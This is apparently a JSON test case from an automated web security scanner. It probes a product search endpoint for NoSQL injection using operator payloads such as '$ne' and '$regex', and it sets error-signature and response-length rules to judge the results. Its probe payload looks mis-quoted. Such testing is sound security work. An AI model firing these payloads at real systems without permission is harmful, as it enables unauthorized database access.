      "base_url": "http://{host}",
      "method": "GET",
      "endpoint": "/rest/products/search",
      "parameter": "name",
      "payloads": [
        {
          "tier": "benign",
          "payloads": [
            {
              "location": "body",
              "value": "{\"name\":\"test-product\"}"
            }
          ],
          "description": "Baseline safe search body.",
          "encoding": "utf-8",
          "content_type": "application/json",
          "header": []
        },
        {
          "tier": "probe",
          "payloads": [
            {
              "location": "body",
              "value": "{\"name\":\"{\"$ne\":null}"
            }
          ],
          "description": "Probe with common NoSQL operator-like payload to elicit parse errors or altered results.",
          "encoding": "utf-8",
          "content_type": "application/json",
          "header": []
        },
        {
          "tier": "exploit",
          "payloads": [
            {
              "location": "body",
              "value": "{\"name\":{\"$regex\":\".*\"}}"
            },
            {
              "location": "body",
              "value": "{\"name\":{\"$ne\":\"nonexistent\"}}"
            }
          ],
          "description": "Further NoSQL-style inputs to attempt result manipulation if server deserializes JSON into query operators.",
          "encoding": "utf-8",
          "content_type": "application/json",
          "header": []
        }
      ],
      "prerequisites": [
        {
          "type": "custom",
          "description": "No auth required; ensure benign search returns consistent baseline for comparison."
        }
      ],
      "oracle_rules": [
        {
          "signal": "error_signature",
          "condition": "response_body_matches(/Mongo|syntax error|Query failed|Invalid query|E1100|Cast to ObjectId failed/i)",
          "weight": 1.0
        },
        {
          "signal": "response_length_diff",
          "condition": "abs(body_len_probe - body_len_baseline)/max(1,body_len_baseline) *100 >= 40",
          "threshold": {
            "body_length_delta_pct": 40.0,
            "numeric_value": 40.0
          },
          "weight": 1.0
        }
      ],
      "pass_logic": "any",
      "safety": {
        "idempotent_required": true,
        "destructive_ok": false,
        "max_requests": 8
      },
      "max_retries": 2,
      "delay_between_requests": 0.5,
      "notes": "Send benign JSON body then NoSQL operator-like payloads. Compare body lengths and look for DB error signatures.",
      "tags": [
        "nosql_injection",
        "search"
      ],
      "estimated_duration": 120
    }
